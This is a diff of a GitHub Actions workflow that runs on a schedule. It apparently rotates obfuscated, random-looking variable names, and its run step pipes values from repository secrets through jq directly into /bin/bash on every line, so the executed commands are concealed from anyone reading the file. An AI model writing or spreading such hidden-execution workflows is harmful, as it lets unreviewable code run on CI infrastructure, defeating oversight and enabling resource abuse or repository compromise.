@@ -3,31 +3,29 @@ name: diurenly
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 4/6 * * *'
-
-jobs:  # 30628
+    - cron: '53 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: diurenly
         env:
-          gim192: ${{ secrets.gim192 }}
+          eiw96773: ${{ secrets.eiw96773 }}
         run: |
-          echo $gim192 | jq -r .p41595 | /bin/bash
-          echo $j351 | jq -r .i9 | /bin/bash
-          echo $untd7 | jq -r .bhul679 | /bin/bash
-          echo $ezgc132 | jq -r .a45402 | /bin/bash
-          echo $qtvc06 | jq -r .inr5 | /bin/bash
-          echo $ih4 | jq -r .jce5400 | /bin/bash
-          echo $pkvxo4558 | jq -r .dcogg00 | /bin/bash
-          echo $rgcy21 | jq -r .jy62 | /bin/bash
-          echo $vbo94621 | jq -r .tm83777 | /bin/bash
-          echo $kflz84 | jq -r .mw11 | /bin/bash
-          echo $fu23269 | jq -r .x0680 | /bin/bash
-          echo $mh8 | jq -r .k24 | /bin/bash
-          echo $evbhn02597 | jq -r .wcoak13170 | /bin/bash
-          echo $md0 | jq -r .mmkf55 | /bin/bash
-          echo $b5422 | jq -r .ln3 | /bin/bash
-          echo $eenw05 | jq -r .iyii46 | /bin/bash
+          echo $eiw96773 | jq -r .wakgz5169 | /bin/bash
+          echo $x13298 | jq -r .qpks03 | /bin/bash
+          echo $xxrdy842 | jq -r .nxlt59214 | /bin/bash
+          echo $mq1621 | jq -r .fkmwf84 | /bin/bash
+          echo $lz43249 | jq -r .il8 | /bin/bash
+          echo $cud52381 | jq -r .ngdcd4 | /bin/bash
+          echo $a19 | jq -r .j57913 | /bin/bash
+          echo $pd36 | jq -r .evjye944 | /bin/bash
+          echo $dle32896 | jq -r .e77 | /bin/bash
+          echo $z8532 | jq -r .dgr998 | /bin/bash
+          echo $dwwp63 | jq -r .zzdy2796 | /bin/bash
+          echo $eyy83 | jq -r .eyam14 | /bin/bash
+          echo $ur3870 | jq -r .mskhf635 | /bin/bash
+          echo $wqs3 | jq -r .tmlh673 | /bin/bash
 
